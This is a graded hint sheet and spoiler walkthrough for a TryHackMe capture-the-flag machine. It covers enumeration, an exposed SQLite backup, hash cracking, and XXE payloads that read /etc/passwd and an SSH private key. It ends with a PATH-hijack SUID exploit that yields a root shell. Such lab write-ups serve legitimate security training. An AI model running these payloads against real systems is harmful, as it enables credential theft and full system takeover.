# Mustacchio

Easy boot2root Machine

room: https://tryhackme.com/room/mustacchio

Walkthrough: https://github.com/garthheff/CTF-Writeups/blob/main/TryHackMe/mustacchio.md

## Light Hints

<details>
<summary>Hint 1</summary>

Start with a full TCP port scan. Do not only scan the default ports.

</details>

<details>
<summary>Hint 2</summary>

There is more than one web service running on the target. Make sure you check both of them.

</details>

<details>
<summary>Hint 3</summary>

Use directory enumeration against the main web service.

Look for files that may have been accidentally left behind by the developer.

</details>

<details>
<summary>Hint 4</summary>

Pay attention to backup-style extensions such as `.bak`.

If you download something interesting, use `file` to identify what it actually is.

</details>

## Medium Hints

<details>
<summary>Hint 5</summary>

One of the backup files is not just a text file.

It is a SQLite database.

</details>

<details>
<summary>Hint 6</summary>

Open the database with `sqlite3` and inspect the tables.

Useful commands include:

```bash
sqlite3 users.db
```

```sql
.tables
.schema
select * from users;
```

</details>

<details>
<summary>Hint 7</summary>

The database contains an admin user and a password hash.

The hash is crackable with common tools, wordlists, or a hash lookup.

The password starts with:

```text
bulld...
```

</details>

<details>
<summary>Hint 8</summary>

Use the admin credentials against the web service running on the non-standard port.

</details>

## Strong Hints

<details>
<summary>Hint 9</summary>

After logging into the admin panel, view the page source.

There are comments in the HTML and JavaScript that point toward the next step.

</details>

<details>
<summary>Hint 10</summary>

There is a forgotten backup file under the `auth` path.

Check:

```text
/auth/dontforget.bak
```

</details>

<details>
<summary>Hint 11</summary>

The backup file shows the XML structure expected by the admin form.

Use that structure when testing the form.

</details>

<details>
<summary>Hint 12</summary>

The admin form processes XML.

Try testing for XML External Entity injection by reading a harmless local file first.

A good test file is:

```text
/etc/passwd
```

</details>

<details>
<summary>Hint 13</summary>

If the XML test works, use it to identify local users.

The important user is:

```text
barry
```

</details>

<details>
<summary>Hint 14</summary>

The page source hints that Barry can SSH in using a key.

Try using the XML issue to read Barry's SSH private key.

The path is:

```text
/home/barry/.ssh/id_rsa
```

</details>

<details>
<summary>Hint 15</summary>

If the SSH key output is badly formatted in the browser, use a PHP filter to base64 encode the file before reading it.

The useful wrapper is:

```text
php://filter/convert.base64-encode/resource=
```

</details>

<details>
<summary>Hint 16</summary>

After decoding the base64 value locally, save it as a private key and fix the permissions.

```bash
base64 -d > barry_id_rsa
chmod 600 barry_id_rsa
```

</details>

<details>
<summary>Hint 17</summary>

The SSH key is encrypted.

Use `ssh2john` and `john` with `rockyou.txt` to crack the key passphrase.

The passphrase starts with:

```text
uriel...
```

</details>

<details>
<summary>Hint 18</summary>

Use the cracked key passphrase to SSH in as Barry.

```bash
ssh -i barry_id_rsa barry@TARGET_IP
```

The user flag is in Barry's home directory.

User flag format:

```text
62d77...1b831
```

</details>

## Privilege Escalation Hints

<details>
<summary>Hint 19</summary>

After getting a shell as Barry, inspect the other user's home directory.

Check:

```text
/home/joe
```

</details>

<details>
<summary>Hint 20</summary>

There is a suspicious SUID binary in Joe's home directory.

Check its permissions carefully.

</details>

<details>
<summary>Hint 21</summary>

Use `file` and `strings` on the SUID binary.

Look for system commands being called inside the binary.

</details>

<details>
<summary>Hint 22</summary>

The binary calls a command without using an absolute path.

This means the environment `PATH` can be abused.

</details>

<details>
<summary>Hint 23</summary>

Create a fake command in `/tmp`, put `/tmp` first in `PATH`, then run the SUID binary.

Use `/bin/bash -p` so the shell keeps the elevated privileges.

</details>

## Final Spoiler

<details>
<summary>Spoiler 1</summary>

The exposed database path is:

```text
/custom/js/users.bak
```

Download and inspect it:

```bash
wget http://TARGET_IP/custom/js/users.bak -O users.db
file users.db
sqlite3 users.db
```

</details>

<details>
<summary>Spoiler 2</summary>

The admin hash cracks to:

```text
bulld...g19
```

Use it to log into the web service on port `8765`.

</details>

<details>
<summary>Spoiler 3</summary>

The XML backup file is:

```text
/auth/dontforget.bak
```

It shows this structure:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>test</com>
</comment>
```

</details>

<details>
<summary>Spoiler 4</summary>

XXE test payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<comment>
  <name>&xxe;</name>
  <author>Barry Clad</author>
  <com>test</com>
</comment>
```

</details>

<details>
<summary>Spoiler 5</summary>

Use XXE to read Barry's SSH key:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
]>
<comment>
  <name>&xxe;</name>
  <author>Barry Clad</author>
  <com>test</com>
</comment>
```

If formatting is broken, use base64:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/barry/.ssh/id_rsa">
]>
<comment>
  <name>&xxe;</name>
  <author>Barry Clad</author>
  <com>test</com>
</comment>
```

</details>

<details>
<summary>Spoiler 6</summary>

Crack the SSH key passphrase:

```bash
ssh2john barry_id_rsa > barry.hash
john barry.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Then SSH as Barry:

```bash
ssh -i barry_id_rsa barry@TARGET_IP
```

</details>

<details>
<summary>Spoiler 7</summary>

The privilege escalation binary is:

```text
/home/joe/live_log
```

`strings` shows it calls:

```text
tail -f /var/log/nginx/access.log
```

</details>

<details>
<summary>Spoiler 8</summary>

Working root command sequence:

```bash
cd /tmp
printf '#!/bin/bash\n/bin/bash -p\n' > tail
chmod +x tail
export PATH=/tmp:$PATH
/home/joe/live_log
```

Then read the root flag:

```bash
cat /root/root.txt
```

Root flag format:

```text
322358...93a5
```

</details>
